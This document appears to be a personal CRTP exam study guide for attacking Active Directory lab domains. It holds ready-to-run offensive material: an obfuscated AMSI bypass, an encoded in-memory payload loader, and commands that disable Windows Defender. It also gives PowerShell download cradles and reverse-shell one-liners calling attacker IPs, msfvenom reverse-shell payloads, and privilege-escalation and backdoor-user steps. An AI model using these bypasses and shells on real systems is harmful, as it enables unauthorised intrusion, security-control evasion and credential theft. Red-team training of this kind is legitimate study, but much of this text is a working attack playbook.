# CRTP One Week Challenge
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/34fd32af-5087-4184-984b-75e7b4ad0c44)
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/d1ee2b35-3e75-4419-9adc-91827daa5223)

# Tips
1. Admin on another machine use `"winrs"`
2. student1 is Admin on another machine (adminsrv) use `"Enter-PSSession"` to get a shell; use MimiEx to extract the credentials of adminsrv; perform overpassthehash to start cmd process as adminsrv; check if adminsrv has admin access on dcorp-mgmt yes we have; run SafetyKatz.exe on adminsrv process but you need loader.exe; copy loader.exe to adminsrv; enter dcorp-mgmt using winrs; check if port forwarding is still there; run the command of SafetyKatz.exe using loader.exe; extract the credentials
3. have an Admin Session use `"winrs"`; use SafetyKatz.exe to extract credentials; use Rubes.exe to start cmd
   

### To bypass AV in the cmd
1. launch cmd
2. powershell -ep bypass
3. AMSI bypass
4. . .\PowerView.ps1


#Main Notes
### Things to keep in mind during the exam
```
#Learing Objective 1
Enumerate Users
Enumerate Computers
Enumerate Domain Administrator
Enumerate Enterprise Administrator

#Learing Objective 2
List all the OUs
List all the computers in the StudentMachines OU
List the GPOs
Enumerate GPO applied on the StudentMachines OU

#Learing Objective 3
Enumerate ACL for the Domain Admins group
Enumerate all modified rights/permissions for the students

#Learing Objective 4
Enumerate all domains in the moneycorp.lcoal forest
Map the trusts of the dollarcorp.moneycorp.lcoal domain
Map external trusts in moneycorp.localforest
Identify external trusts of dollarcorp domain

#Learing Objective 5
elevate privilege to local administrator
Identify a machine in the domain where you have local administrative access
Using privileges of a user get DC

#Learing Objective 6
use BloodHound to identify the shortest path to Domain Admins in the dollarcorp admin
```
### Load InviShell to avoid any enhanced login locally
```
C:/AD/Tools/InviShell/RunWithRegistryNonAdmin.bat
```
### Bypass Script Block login
```
iex (iwr http://10.0.10.16/sbloggingbypass.txt-UseBasicParsing)
```
### Bypass AMSI
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
### Bypass Real-Time Monitoring
```
Powershell Set-MpPreference -DisableRealtimeMonitoring $true
Powershell Set-MpPreference -DisableIOAVProtection $true
PowerShell set-MpPreference -DisableAutoExclusions $true
```
### Load Script in memory to bypass Windows Defender
1. before that, you need to bypass the AMSI (AMSI is antivirus special in tracking the memory if there is a malicious code in the memory or not)
```
(neW-oBJeCt  iO.COMpRESsiOn.DeflAteSTrEAm([io.MemoryStREAM][coNveRT]::FrOmBAsE64StRINg( 'pZJRT9swEMff/SlOVqQmIqsyOjZENQnKpAkJWEUZe4jy4CaX1ZoTW7YzGqZ9dy5uBoWHvZAH53y+/8/3tx39kO3sED7DKWesc7L9CaveeWzmL2bTm671ssHpRevRarNC+1uW6OaMmW6tZAmlEs7BjvaHMaAv/6LURWO09TH/hbZFNTvkSRHWRpXzwtMPt0RtgeBLb+Er+qXV5VlVWXQuHrObK111ClPS2KExQyXXosFk/rbdLrWoLuXaCtvHI7p9C3attYI7aX0nFNnwWPp/FpQZPaXwfUxV9yv5QKY62Xqo1TXej5oUdOd3aWVq9U1V48LQ2F/GTxkj2Lvb3iBE4dgZi/a80JXmIV2cnOxb5KLhcADcyWmlFE9YNPa0L3h1A/vcFPhZ42RgrErRhmDR1TXaAWYIk7En0KtziJ7854MzKjlKIdt+yChhsS4iQ4il8OVm6GbRe8yLAuJsuzge6o4+DWOWhTHExyE+n5GM7u49qSb5/1/s9EpYtxGKmpsE0fD4J+fa9PFuZwKm8Nzox2TCJG7jHf8AgiRhjw==' ) , [SySteM.io.comPREssioN.CoMPReSSIONMOde]::DEcompreSS)| % { neW-oBJeCt io.sTreAMreaDER( $_ ,[TexT.eNcoDInG]::asCii)}).readtOeNd() |iEX

```
2. load the PowerShell code on the memory
```
iex(New-Object Net.WebClient).DownloadString('http://172.16.99.7:9090/PowerView.ps1')
```

### Reverse Shell using PowerShellTcp.ps1 & getting a shell using powercat in powershell
```
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/InvokePowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.X -Port 443
powershell.exe iex (iwr http://172.16.100.7:9090/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.7 -Port 889

nc64.exe -lvp 889
powercat -lvp 889 -Timeout 100
```

# PowerShell

Bypassing PowerShell Security using Invisi-Shell  (https://github.com/OmerYa/Invisi-Shell)
```
RunWithPathAsAdmin.bat  (Admin Privilege)
RunWithRegistryNonAdmin.bat  (non-Admin Privilege)
```

Load a script and module (local)
```
. C:\AD\Tools\PowerView.ps1
OR
Import-Module C:\AD\Tools\PowerView.ps1
```

list all the commands u can use in a particular module
```
Get-Command -Module <modulename>
```

Run PowerShell Script on memory after getting a reverse shell
```
iex (iwr http://10.0.10.16/sbloggingbypass.txt-UseBasicParsing)

S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

iex ((New-Object Net.WebClient).DownloadString('http://10.10.10.6/PowerView.ps1')
```

Load a script and module (remotely)
```
ine (New-Object Net.WebClient).DownloadString('http://10.10.16.10/payload.ps1')
```
Bypassing AV Signatures for PowerShell
.      Invoke-Mimi & Invoke-MimiEx are the obfuscated tools of Invoke-Mimikatz
.      if u r going to run a PowerShell script from the disk it may get detected; u can use the AMSITrigger (https://github.com/RythmStick/AMSITrigger) tool to identify the exact part of a script that is detected
.      Scan using AMSITrigger 'AmsiTrigger_x64.exe -i PowerUp.ps1' | Modify the detected code by reversing ex. 'System.AppDomain' to 'niamoDppA.metsyS' | Rescan using AMSITrigger | Repeat the steps till u get a result as "AMSI_RESULT_NOT_DETECTED"
.      u can use DefenderCheck (https://github.com/t3hbb/DefenderCheck) to identify code and strings from a binary / file that Windows Defender may flag
.      simply provide path to the script file to scan it
-     AmsiTrigger_x64.exe -i C:\AD\Tools\Invok-PowerShellTcp_Detected.ps1 DefenderCheck.exe PowerUp.ps1
.      for full obfuscation of PowerShell scripts use Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation)
example of minimal obfuscation; if u run powerup.ps1 and the following line got detected "New-Object System.Net.Sockets.TCPClient($IP,$PORT)"
## Reverse the "Net.Sockets" string on line number 32
```
$string = "stekcoS.teN"
$class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
if ($Reverse)
{
$client = New-Object System.$class.TCPClient($IPAddress,$PORT)
}
```

# Methodology Master
---
## 0. Miscellaneous
> 1. [ ] Remember to bypass AMSI on every new user
> 2. [ ] Check the Execution policy language mode
> 3. [ ] Check all the commands you are allowed to execute

## 1. Domain Enumeration
> 1. [ ] Complete basic Enum
> 2. [ ] enumerate all us`ers
> 3. [ ] enumerate all domain computers
> 4. [ ] GPO && OU
> 5. [ ] ACL's 
> 6. [ ] Trusts
> 7. [ ] Blood-hound
> 8. [ ] SPN

## 2. Local Priv Esc
> 1. [ ] Run *powerups.ps1*
> 2. [ ] **ServiceUnquoted**
> 3. [ ] **ModifiableServiceFile**
> 4. [ ] **ModifiableService**
> 5. [ ] Priv Esc for the above use : **Invoke-ServiceAbuse**
> 6. [ ] **whoami /all** || **whoami /priv**
> 7. [ ] Check Windows abuse and priv esc
> 8. [ ] Hunt for Local Admin users if available from Trust Enum
> 9. [ ] Priv Esc for the above use : PSsession or refer **Invoke-Command**
> 10. [ ] Check if you can Priv esc using *jenkins*
> 11. [ ] Lastly add the user to the localgroup administrators

**NOTE : ONCE A LOCAL ADMINISTRATOR RUN PS as ADMINISTRATOR**

## 3. Domain Admin Priv Esc
> 1. [ ] Hunt for Local Admin Users
> 2. [ ] Check The local Admin Access
> 3. [ ] If yes, Use **Invoke-Command** or **Enter-PSSession**

## 4. Domain Admin Persistence [app locker enabled]
> 1. [ ] Check the Execution policy language mode
> 2. [ ] Checking AppLockerPolicy and note the paths available for us
> 3. [ ] Disable Defender protections
> 4. [ ] Modify Invoke-Mimikatz.ps1 script to call the function in the script itself because we can't dot source files if in constrained language mode
> 5. [ ] run script without dot sourcing it
> 6. [ ] Dump the hashes
> 7. [ ] Get the ekeys
> 8. [ ] Get Credentials from the credentials vault

## 5. Domain Admin Persistence
> 1. [ ] Dump the hashes us the user using *Invoke-Mimikatz*
> 2. [ ] Get the ekeys
> 3. [ ] Get Credentials from the credentials vault
> 4. [ ] Using *Over-Pass-the-Hash Attack* spawn a PowerShell session as that user

## 6. New user from DA Priv Esc
> 1. [ ] Follow the same exact steps from **3. to 5.** if a new user is found

## 7. DC pwn
> 1. [ ] After we get a DA user with Administrator access we can connect to the DC using **Enter-PSSession -ComputerName dcorp-dc**

## 8. Domain Controller Persistence
> 1. [ ] Golden Ticket
> 2. [ ] Silver Ticket
> 3. [ ] DSRM
> 4. [ ] ACL AdminSDHolder
> 5. [ ] ACL DCSync
> 6. [ ] ACL security Descriptors

## 9. Forest Priv Esc

> 1. [ ] Forge inter-forest ticket by trust keys

---

# Domain Enumeration - Basic
1. Get current domain
```
Get-NetDomain
```
2. Get the object of another domain
```
Get-NetDomain -Domain raman.local
```
3. Get the domain password policy
```
Get-DomainPolicy
(Get-DomainPolicy).KerberosPolicy
```
4. Get domain controller
```
Get-DomainController
```
5. Get domain controllers for another domain
```
Get-DomainController -Domain raman.local
```
6. Get a list of all users in the current domain
```
Get-DomainUser  #list all users
Get-DomainUser | select samaccountname, memberof  #Get the list of usernames and their groups
Get-DomainUser -Identity student1  OR Get-DomainUser -Username student1  #select the information only for student1
Get-DomainUser | select samaccountname,logonCount  #Get specific property of all users
Get-DomainUser -LDAPFilter "Description=*built*" | select name,Description OR Find-UserField -SearchField Description -SearchTerm "built"
```
7. Get a list of computers in the current domain
```
Get-DomainComputer  #get all computers
Get-DomainComputer | select samaccountname, dnshostname
Get-DomainComputer -Computername <computername> -FullData
Get-DomainComputer -OperatingSystem "*Server 2016*"
Get-DomainComputer -Ping  #check if the machine is alive or not. if firewall is on this may give u a false positive
Get-DomainComputer -FullData  #list of all data including SID
```
8. Domain Admins Group
```
Get-DomainGroup | select name
Get-DomainGroup -Name "Domain Admins"   #check particular group
Get-DomainGroup -Domain <targetdomain> -Name "Administrators"   #check particular group for different domain
```
9. Get all the members of a particular group
```
Get-DomainGroupMember -Name "Domain Admins" -Recurse -Domain raman.local
```
10. Get the group membership of a user
```
Get-DomainGroup -UserName "student1" | select name
```
11. Enumerate members of the Enterprise Admins group
```
Get-DomainGroupMember -Name "Enterprise Admins"
Get-DomainGroupMember -Name "Enterprise Admins" -Domain raman.local
```
12. List all the local groups on a machine (needs administrator privs on non-dc machines)
```
Get-NetLocalGroup -computerName dcorp-dc
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local  #membership of the groups on the domain controller
```
13. Get members of all the local groups on a machine (needs administrator privs on non-dc machines)
```
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse
```
14. Get members of the local group "Administrators" on a machine (needs administrator privs on non-dc machines)
```
Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators
```



# Shares Enumeration
1. Find Shared on hosts in the current domain
```
Invoke-ShareFinder -Verbose
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC
```
2. Find sensitive files on computers in the domain
```
Invoke-FileFinder -Verbose
```
3. Get all fileservers of the domain
```
Get-NetFileServer
```



# Domain Enumeration - Group Policy Object Enumeration
1. Get all the OUs
```
Get-DomainOU
Get-DomainOU -select displayname  # you can view the GPOs name but not the settings
```
2. List all the computers in the OU
```
(Get-Domain -Identity StudentMachines).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```
3. List the GPOs
```
Get-DomainGPO
Get-DomainGPO -ComputerName dcorp-student1.dollarcorp.moneycorp.local
```
4. Enumerate GPO applied on an OU
```
Get-DomainGPO -Identity '{objectguid}'   #objectguid u will get it form OU Enumeration
```
5. You may use the following
Get GPO(s) that use Restricted Groups or groups.xml for interesting users
```
Get-DomainGPOLocalGroup
```
Get users who are in a local group of a machine using GPO
```
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcop-student1
```
Get machines where the given user is a member of a specific group
```
Get-DomainGPOUserLocalGroupMapping -Identity student -Verbose
```



# Domain Enumeration - Access Control List Enumeration  (better to use Bloodhound)
1. Enumerate ACL for a particular group
```
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
```
2. check the modify rights/permissions in different Group
```
Find-InterestingDomainAcl -ResolveGUIDs   #check IdentityReferenceDomain
```
3. Get the ACLs associated with the specified LDAP path to be used for search
```
Get-DomainObjectAcl -SearchBase 'LDAP://CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local' -ResolveGUIDs -Verbose
```



# Domain Enumeration - Trusts Enumeration
1. Enumerate all domains in raman.local forest
```
Get-ForestDomain -Verbose
Get-ForestDomain -Forest eurocorp.local  #list of domains in different forest
```
2. map all the trusts of the current domain
```
Get-DomainTrust   #TrustAttributes : FILTER_SIDs means external trust
Get-DomainTrust -Domain us.dollarcorp.moneycorp.local  #different Domain
```
3. Enumerate the current forest
```
Get-Forest  #check domains, GlobalCatalogs
Get-Forest -Forest raman.local  #get the details about different forest.
```
4. Get all global catalogs for the current forest
```
Get-ForestGlobalCatalog  #check global catalogs of the current forest
Get-ForestGlobalCatalog -Forest eurocorp.local  #check global catalogs of different forest
```
5. Map trusts of a forest
```
Get-ForestTrust  #if u get nothing means there is no forest relationship trust in the current forest
Get-ForestTrust -Forest eurocorp.local  #check the forest relationship trust for external forest 
```
6. Map External trusts in meneycorp.local forest
```
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```
Note: for the FILTER_SIDs you need to have either Bidirectional or one-way trust (TrustDirection) to extract information from the forest  (check LabManual page #19)



# User Hunting
### Local Admin Access
1. Find all machines on the current domain where the current user has local admin access
```
Find-LocalAdminAccess -Verbose
```

2. Find local admins on all machines of the domain(needs administrator privs on non-dc machines)
```
Invoke-EnumerateLocalAdmin -Verbose
```

### Sessions
1. Find computers where a domain admin (or specified user/group) has sessions
```
. .\Invoke-SessionHunter.ps1  -->  Invok-SessionHunter
#OR
Invoke-UsersHunter
Invoke-UsersHunter - GroupName "RPDUsers"
```

2. To confirm admin access
```
. .\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
#OR
Invoke-UserHunter -CheckAccess
Invoke-UserHunter -Verbose
```

### Logged-in
1. Find computers where a domain admin is logged-in
```
Invoke-UserHunter -Stealth
```
2. Get users with privileges in other domains inside the forest
```
Get-DomainForeingUser 
```
3. Get groups with privileges in other domains inside the forest
```
Get-DomainForeignGroupMember 
```



# Active Directory - Local Privilege Escalation
check video#12 and lab manual page#26
> 1. [ ] Autorun
> 2. [ ] AlwaysInstallElevated
> 3. [ ] Service Registry
> 4. [ ] Executable Files
> 5. [ ] Startup Applications
> 6. [ ] DLL Hijacking
> 7. [ ] BinPath
> 8. [ ] Unquoted Service Paths
> 9. [ ] Juicy potato attack
> 10. [ ] Hot Potato attack
> 11. [ ] Kernel Exploits
> 12. [ ] Password Mining Escalation - Firefox
> 13. [ ] Backup
> 14. [ ] Runas-Savdcreds
> 15. [ ] Backup Operators (Disk shadow + Robocopy)
> 16. [ ] Abusing GPO permissions
> 17. [ ] Export LAPS Passwords
> 18. [ ] Common for the course

Windows Enumeration:
- system enum
```
systeminfo
check the patches (HotFixes) --> wmic qfe
list the drives ex. C: D: --> wimc logicaldisk
list the drives ex. C: D: --> wmic logicaldisk get caption,description,providername
gather information about a file --> get-content file.lnk
```
- user enum and groups
```
user that you are logged in with --> whoami
check user privilege --> whoami /priv
check the group that you are belonging to --> whoami /groups
check users in admin group --> net localgroup Administrator
show all users on the machine --> net user
gather info about X user --> net user <username>
check all users in X group --> localgroup <groupname>
```
- network enum
```
ipconfig /all
check all IPs that are connected to the machine --> arp -a
check what other machines are communicating to the machine (Possible to Pivoting) --> route print
check open ports on the machine (Possible to port forwarding) --> netstat -ano
```
- password hunting (passwords are in files). make sure in which directory you are then run the command. you also can run the command in the root directory
-     findstr /si password *.txt *.ini *.config
- firewall & Antivirus
 ```
find info about particular services like windefend --> sc query windefend
list all running services on the machine --> sc queryex type= service
check firewall settings --> netsh firewall show state OR netsh advfirewall firewall dump
```
- Windows-exploit-suggester usage:
  1- run 'systeminfo' and save it into a <sysinfo.txt>
  2- download and extract the tool from Git Hub.
  3- install pip if you don't have it --> curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py; python get-pip.py && pip install xlrd --upgarde
  4- Update the database --> ./windows-exploit-suggester.py --update
  5- ./windows-exploit-suggester.py --database <updatedDB.xls> --systeminfo <sysinfo.txt>
  
- Stored Passwords
- check the registry. you may find a default password
-     reg query HKLM /f password /t REG_SZ /s
- if you find any default password run the following
-     reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
- if SSH is running on the system use the found credentials to login

**keep in mind to check the permissions in windows like icacls, icacls root.txt /grant <username>:F (this will grant full access to a file)**
transferring a file in windows using pyftpdlib
-     python -m pyftpdlib 21 (attacker machine)
-     ftp 10.0.2.10
Add a user
-     net user raman to0or /add

### After running powerup always check AbuseFuncion
For example you got the following
```
AbuseFuncion : Invoke-ServiceAbuse -Name '<ServiceName>'
```
use help with example to check the example
```
help Invoke-ServiceAbuse -Examples
Invoke-ServiceAbuse -Name "AbyssWebServer" -UserName "dcorp\student407"
```

you can use the below tools for complete coverage
- PowerUp   https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- Privesc   https://github.com/enjoiz/Privesc
- winPEAS   https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS

# <span style="color:lightblue">Autorun</span>

## <span style="color:lightgreen">Methodology</span>

Some programs are determined by the system administrator to run as soon as the system starts, so we assume that if we have a program we can modify it so that we add our own malicious file in place of the program. The first time the system is restarted, the first user to log in to the system will run the malicious file according to its authority.

### Using Autoruns and AccessChk
1. Transfer [Autoruns64.exe]([https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)) on the Windows/AD machine and execute it on cmd
```console
C:\Temp> Autoruns64.exe
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/91e45f42-3bf4-4503-a88d-b5ec77207f3b)
2. In Autoruns, click on the `"Logon"` tab.

3. From the listed results, notice that the `"My Program"` entry is pointing to `"C:\Program Files\Autorun Program\program.exe"`.
   
4. Go back to the command prompt run [AccessChk64.exe]([https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk))
```console
C:\Temp> accesschk64.exe -wvu "C:\Program Files\Autorun Program"

# Switch meaning
# w --> only show items that have write access
# v --> verbose; dispaly as many details as possible
# u --> ignore the errors
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/2e31e838-22b0-4aa4-be5f-02dd129b0630) in Everyone we have `"FILE_ALL_ACCESS"`

### Using cmd
```
req query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
### Using winPEAS (recommended)
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/1f67ed07-25c9-49c1-9572-941443e2fa2c)

From the output, notice that the `"Everyone"` user group has `"AllAccess"` permission on the `"program.exe"` file. To gain administrator access, we can drop our malicious executable file by overwriting the file.
1. confirm the AllAccess privilege that we got form winPEAS by running accesschk.exe
```
accesschk.exe /accepteula -wvu <user> "C:\Program Files\Autorun Program\program.exe"
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/b9c86c44-bf07-4604-b798-38a5c5ae5d00)


### Using PowerUp
1. Run [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) and Run `Invoke-AllChecks` (check the autoruns field)

```console
C:\Temp> powershell -ep bypass
PS C:\Temp>. .\PowerUp.sp1
PS C:\Temp> Invoke-AllChecks
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3c45bf70-456b-40c0-9d3c-e27616c73b78)


From the output, notice that the `"Everyone"` user group has `"FILE_ALL_ACCESS"` permission on the `"program.exe"` file. To gain administrator access, we can drop our malicious executable file by overwriting on the file.

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o program.exe
```
3. Transfer the generated file, `program.exe`, to the Windows VM.

### Windows VM

1. replace `program.exe` in `'C:\Program Files\Autorun Program'`

### Kali VM

1. Wait for a reverse shell on your kali machine.

# <span style="color:lightblue">AlwaysInstallElevated</span>

## <span style="color:lightgreen">Methodology</span>

# AlwaysInstallElevated  is a type of Registry Escalation.

run powerup and check if the AlwaysInstallElevated is there or not. if yes you can run the command that is in the powerup to add a new user to the administrator group (it will generate a program to add the user)

check AlwaysInstallElevated from the cmd. if the AlwaysInstallElevated has a value of 0x1 means it's on
```console
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```
 then run the program that powerup generated to create a backdoor user and set the user to the administrator group
another option is to use meterpreter to elevate your session
-     exploit/windows/local/always_install_elevated

## <span style="color:lightgreen">Detection</span>
### Windows VM

1. Open command prompt and type: 
```console
C:\Temp> reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```
+ `0x1` means its ON
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/7f8ab42c-77c2-4e52-b0d7-06fdf5ccd1fd)


2. In command prompt type: 
```console
C:\Temp>reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```
+ `0x1` means its ON
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/636ded17-c70b-4b17-9db0-f4882108d54a)


From the both output, we notice that `“AlwaysInstallElevated”` value is `1`. Hence, we can abuse this function to get privilege escalation.

### Using PowerUp

1. Run Powerup.ps1 and Run `Invoke-AllChecks` (check the AlwaysInstallElevated field)
```console
C:\Temp> powershell -ep bypass
PS C:\Temp>. .\PowerUp.sp1
PS C:\Temp> Invoke-AllChecks
```

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/5d2380a0-2ecd-4bc2-a73c-fd5d44d9d762)


2. Run `Write-UserAddMSI` and Add backdoor user in *Administrators* group (Required RDP access)

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/53dd5cb6-8e32-49e8-9f33-9c84f883018d)


3. Check local Administrators
```console
C:\Temp> net localgroup administrators
# now backdoor is added to the localgroup administrators group
```

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```
2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f msi -o setup.msi
```
3. Copy the generated file, `setup.msi`, to the Windows VM.

### Windows VM

1. Place `'setup.msi'` in `'C:\Temp'`
2. Open command prompt and type: 
```console
C:\Temp> msiexec /quiet /qn /i C:\Temp\setup.msi
```

### Kali VM

1. Wait for a reverse shell on your kali machine.


# <span style="color:lightblue">Service Registry</span>

## <span style="color:lightgreen">Methodology</span>
A service registry consists of a cluster of servers that use a replication protocol to maintain consistency. Hence if we get Full Contol permission over the registry key, we can drop our malicious executable file to gain administrator access. 

## <span style="color:lightgreen">Detection</span>

### Using winPEAS
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/61c219fe-678e-48bd-91ae-aff0e82c866e)

winPEAS tells us regsvc service can be modified

1. use accesschk to confirm if you can modify the service
```
accesschk.exe /accepteula -kwv HKLM\system\currentcontrolset\services\regsvc
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/22536b55-2113-4686-a183-9e7f2801296a)

2. make sure that you can stop & start the service
```
accesschk.exe /accepteula -cv regsvc
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/de27514b-e6c1-4174-8ef2-7ffeac8ab9f6)

### Manual Detection

1. Open powershell prompt and type: 
```powershell
C:\Temp> powershell -ep bypass
PS C:\Temp> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/5cd1c41a-e02b-4645-a846-4964f6cc6c53)


2. Notice that the output suggests that user belong to `"NT AUTHORITY\INTERACTIVE"` has `"FullContol"` permission over the registry key.

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o x.exe
```
3. Copy the generated file `x.exe`, to the Windows VM.

### Windows VM

1. Place `x.exe` in `'C:\Temp'`
2. Open command prompt at type: 
```console
C:\Temp> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
```
3. In the command prompt type: 
```console
C:\Temp> sc start regsvc
# If it doesnt work try restaring the service and perform the exploit egain
```

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/80be99bc-4576-4ddb-a3d2-a2880c33864b)


### Kali VM

1. Wait for a reverse shell on your kali machine.

### Another approach using windows_service.c file

1. Transfer the file from Windows to Kali. Use an FTP server to do that
-     python -m pyftpdlib -p 21 --write    (pip3 install pyftpdlib  #to download it) (run it on kali)
2. head to C:\Tools\Source and connect to the kali FTP server, anonymous login, then put the windows_service.c file
-     ftp 10.10.16.4 | username:anonymous | put windows_service.c
edit the windows_service file and replace the system("whoami > ..") with system("cmd.exe /k net localgroup administrator user /add"). 
3. compile the C file
-     w64-mingw32-gcc windows_service.c -o raman.exe     (sudo apt install gcc-mingw-w64)
4. move the compiled c file to Windows then run it using
-     reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc  /v ImagePath /t REG_EXPAND_SZ /d c:\temp\raman.exe /f
-     sc start regsvc
5. net localgroup administrator

### you can use the above approach by generating a reverse shell instead of adding a user
1. Transfer the file from Windows to Kali. Use an FTP server to do that
-     python -m pyftpdlib -p 21 --write    (pip3 install pyftpdlib  #to download it) (run it on kali)
2. head to C:\Tools\Source and connect to the kali FTP server, anonymous login, then put the windows_service.c file
-     ftp 10.10.16.4 | username:anonymous | put windows_service.c
3. edit the windows_service file and replace the system("whoami > ..") with system("nc.exe -e cmd.exe <Attacker_IP> <PORT>").
4. compile the C file
-     w64-mingw32-gcc windows_service.c -o raman.exe     (sudo apt install gcc-mingw-w64)
5. move the compiled c file to Windows then run it using
-     reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc  /v ImagePath /t REG_EXPAND_SZ /d c:\temp\raman.exe /f
-     sc start regsvc 


# <span style="color:lightblue">Executable Files</span>

## <span style="color:lightgreen">Methodology</span>
Microsoft Windows services, formerly known as NT services, enable you to create long-running executable applications that run in their own Windows sessions. These services can be automatically started when the computer boots, can be paused and restarted, and do not show any user interface.

Hence if we get Full Contol permission over the file path location, we can drop our malicious executable file to gain administrator access.

## <span style="color:lightgreen">Detection</span>

1. Run Powerup.ps1 and Run `Invoke-AllChecks` (check the service executable field)
```console
C:\Temp> powershell -ep bypass
PS C:\Temp>. .\PowerUp.sp1
PS C:\Temp> Invoke-AllChecks
```

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/d4167972-4387-4324-a03b-d9a4e951b055)


We can see that we have Modifiable File access to `"c:\Program Files\File Permissions Service\filepermservice.exe"`. To gain administrator access, we can drop our malicious executable file on this location.

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o x.exe
```

3. Copy the generated file `x.exe`, to the Windows VM and replace it over  `filepermsvc.exe`.

### Windows VM

1. In command prompt type: 
```console
C:\Temp> sc start filepermsvc
```

### Kali VM

1. Wait for a reverse shell on your kali machine.

### Another approach using windows_service.c file

1. Transfer the file from Windows to Kali. Use an FTP server to do that
-     python -m pyftpdlib -p 21 --write    (pip3 install pyftpdlib  #to download it) (run it on kali)
2. head to C:\Tools\Source and connect to the kali FTP server, anonymous login, then put the windows_service.c file
